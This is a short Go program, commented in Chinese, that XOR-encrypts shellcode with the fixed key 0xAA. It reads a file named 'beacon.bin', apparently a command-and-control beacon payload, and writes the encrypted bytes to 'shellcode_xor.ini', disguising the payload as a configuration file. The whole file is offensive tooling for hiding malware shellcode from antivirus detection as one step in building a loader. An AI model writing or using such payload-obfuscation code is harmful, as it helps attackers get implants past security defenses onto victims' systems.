package main

import (
	"fmt"
	"os"
)

/* 将shellcode进行加密

   shellcode: shellcode.txt
   加密方法: xor
   密钥: 0xAA
   加密后shellcode: shellcode_xor.ini

*/
func main() {
	shellcode, err := os.ReadFile("beacon.bin")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}

	key := byte(0xAA)
	encrypted := make([]byte, len(shellcode))
	for i, b := range shellcode {
		encrypted[i] = b ^ key
	}
	outputFile, err := os.Create("shellcode_xor.ini")
	if err != nil {
		fmt.Println("Error creating output file:", err)
		return
	}
	defer outputFile.Close()


	if _, err := outputFile.Write(encrypted); err != nil {
		fmt.Println("Error writing to output file:", err)
		return
	}

	fmt.Println("Shellcode encrypted successfully and saved to shellcode_xor.ini")
	
	



}